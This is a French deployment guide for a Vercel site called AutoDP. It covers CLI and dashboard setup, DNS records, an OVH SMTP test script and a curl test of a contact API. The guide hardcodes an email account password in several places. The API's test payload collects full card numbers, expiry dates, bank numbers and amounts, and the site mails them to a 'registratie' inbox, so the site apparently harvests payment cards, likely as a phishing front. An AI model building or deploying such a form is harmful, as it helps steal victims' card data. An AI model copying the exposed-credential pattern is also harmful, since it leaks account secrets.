# Instructions de Déploiement Vercel - AutoDP

## 🚀 Déploiement sur Vercel

### 1. Préparation du projet

1. **Installer les dépendances** :
   ```bash
   npm install
   ```

2. **Créer le fichier `.env.local`** :
   ```bash
   # Configuration SMTP OVH
   EMAIL_USER=registratie@autodp.org
   EMAIL_PASS=S.registratie2025
   EMAIL_HOST=ssl0.ovh.net
   EMAIL_PORT=465
   
   # Email de réception
   RECIPIENT_EMAIL=registratie@autodp.org
   ```

### 2. Configuration Vercel

#### Option A : Déploiement via CLI Vercel

1. **Installer Vercel CLI** :
   ```bash
   npm i -g vercel
   ```

2. **Se connecter à Vercel** :
   ```bash
   vercel login
   ```

3. **Déployer le projet** :
   ```bash
   vercel
   ```

4. **Configurer les variables d'environnement** :
   ```bash
   vercel env add EMAIL_USER
   vercel env add EMAIL_PASS
   vercel env add EMAIL_HOST
   vercel env add EMAIL_PORT
   vercel env add RECIPIENT_EMAIL
   ```

#### Option B : Déploiement via Interface Web Vercel

1. **Connecter le repository GitHub** :
   - Aller sur [vercel.com](https://vercel.com)
   - Cliquer sur "New Project"
   - Importer le repository GitHub

2. **Configurer les variables d'environnement** :
   - Dans le dashboard Vercel, aller dans Settings > Environment Variables
   - Ajouter les variables suivantes :
     ```
     EMAIL_USER = registratie@autodp.org
     EMAIL_PASS = S.registratie2025
     EMAIL_HOST = ssl0.ovh.net
     EMAIL_PORT = 465
     RECIPIENT_EMAIL = registratie@autodp.org
     ```

3. **Configurer le domaine personnalisé** :
   - Dans Settings > Domains
   - Ajouter `autodp.org`
   - Configurer les DNS selon les instructions Vercel

### 3. Configuration DNS

Pour le domaine `autodp.org`, configurer les enregistrements DNS :

```
Type: A
Name: @
Value: 76.76.19.61

Type: CNAME
Name: www
Value: cname.vercel-dns.com
```

### 4. Test de l'API

Une fois déployé, tester l'API :

```bash
curl -X POST https://autodp.org/api/contact?type=enregistrement \
  -H "Content-Type: application/json" \
  -d '{
    "nom_complet": "Test User",
    "email": "test@example.com",
    "telephone": "0123456789",
    "adresse": "123 Test Street",
    "carte_be": "BE76 1234 5678 9012",
    "carte_52_49_51": "1234 5678 9012 3456",
    "date_expiration": "12/25",
    "submission_id": "TEST123",
    "montant": "100.00"
  }'
```

### 5. Monitoring et Logs

- **Logs Vercel** : Dashboard > Functions > View Function Logs
- **Monitoring** : Dashboard > Analytics
- **Erreurs** : Dashboard > Functions > Error Logs

## 🔧 Configuration SMTP OVH

### Paramètres de connexion :
- **Host** : ssl0.ovh.net
- **Port** : 465
- **Sécurité** : SSL/TLS
- **Authentification** : Oui

### Test de connexion SMTP :
```javascript
// Test dans la console Vercel
const nodemailer = require('nodemailer');

const transporter = nodemailer.createTransporter({
  host: 'ssl0.ovh.net',
  port: 465,
  secure: true,
  auth: {
    user: 'registratie@autodp.org',
    pass: 'S.registratie2025'
  }
});

transporter.verify((error, success) => {
  if (error) {
    console.log('Erreur SMTP:', error);
  } else {
    console.log('SMTP configuré avec succès');
  }
});
```

## 📧 Templates d'Email

L'API génère automatiquement des emails HTML avec :
- Design responsive
- Informations du formulaire formatées
- Différenciation entre "Enregistrement" et "Réception de fond"
- Horodatage automatique

## 🛡️ Sécurité

- Variables d'environnement sécurisées
- Validation des données côté serveur
- Protection contre les injections
- Rate limiting (configuré par Vercel)

## 🔄 Mise à jour

Pour mettre à jour le déploiement :
```bash
git add .
git commit -m "Update"
git push
# Vercel déploie automatiquement
```

## 📞 Support

En cas de problème :
1. Vérifier les logs Vercel
2. Tester la connexion SMTP
3. Vérifier les variables d'environnement
4. Contacter le support Vercel si nécessaire
